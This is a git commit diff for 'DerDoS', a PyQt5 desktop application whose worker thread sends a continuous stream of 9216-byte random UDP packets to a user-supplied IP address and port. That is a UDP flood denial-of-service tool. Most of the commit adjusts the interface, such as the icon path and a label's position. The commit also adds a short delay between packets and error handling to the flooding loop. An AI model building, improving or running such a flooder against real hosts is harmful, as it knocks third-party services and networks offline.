d04058c1aadedaa3399fe74afae2d3271caa8ecf
NickKhunapoj <Nickkipad@gmail.com>
2024-12-12 23:30:28 +0700

    restore old file for pr

--- main_mac_arm64.py
+++ main_mac_arm64.py
@@ -1,7 +1,7 @@
 from PyQt5 import QtCore, QtGui, QtWidgets, QtTest
 import socket
 import os
-
+import time
 class Ui_MainWindow(object):
     def setupUi(self, MainWindow):
         MainWindow.setObjectName("MainWindow")
@@ -11,10 +11,8 @@ class Ui_MainWindow(object):
         MainWindow.setMaximumSize(QtCore.QSize(494, 278))
         MainWindow.setWindowTitle("DerDoS")
         icon = QtGui.QIcon()
-        icon.addPixmap(QtGui.QPixmap("asset/logo.ico"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
+        icon.addPixmap(QtGui.QPixmap("derdos_builder/asset/windows-logo.ico"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
         MainWindow.setWindowIcon(icon)
-        MainWindow.setLayoutDirection(QtCore.Qt.LeftToRight)
-        MainWindow.setTabShape(QtWidgets.QTabWidget.Rounded)
         self.centralwidget = QtWidgets.QWidget(MainWindow)
         self.centralwidget.setObjectName("centralwidget")
         self.plainTextEdit = QtWidgets.QPlainTextEdit(self.centralwidget)
@@ -31,7 +29,7 @@ class Ui_MainWindow(object):
         self.stop.setText("Stop")
         self.stop.setEnabled(False)
         self.label = QtWidgets.QLabel(self.centralwidget)
-        self.label.setGeometry(QtCore.QRect(10, 240, 141, 21))
+        self.label.setGeometry(QtCore.QRect(10, 230, 141, 21))
         self.label.setStyleSheet("font: 300 6pt \"Arial\";")
         self.label.setAlignment(QtCore.Qt.AlignCenter)
         self.label.setObjectName("label")
@@ -138,24 +136,30 @@ class Ui_MainWindow(object):
             self.stop.setEnabled(False)
 
 class WorkerThread(QtCore.QThread):
+    update_text_signal = QtCore.pyqtSignal(str)
+
     def __init__(self, ui_reference):
         super().__init__()
         self.ui_reference = ui_reference
         self.running = True
+        self.update_text_signal.connect(self.ui_reference.plainTextEdit.appendPlainText)
 
     def run(self):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            data = os.urandom(9216)
-            while self.running:
+            data = os.urandom(9216)  # Reduced packet size to prevent buffer overflow
+            while self.running:  # Keep running until stopped by the user
                 s.sendto(data, (self.target_ip, self.target_port))
+                time.sleep(0.01)  # Optional: delay to prevent overwhelming the system
         except Exception as e:
-            # Print to plainTextEdit
-            self.ui_reference.plainTextEdit.clear()
-            self.ui_reference.plainTextEdit.appendPlainText(f"Error: {e}\n")
+            self.update_text_signal.emit(f"Error: {e}\n")
+        finally:
+            s.close()
 
     def stop(self):
         self.running = False
+        self.quit()
+        self.wait()
 
 if __name__ == "__main__":
     import sys
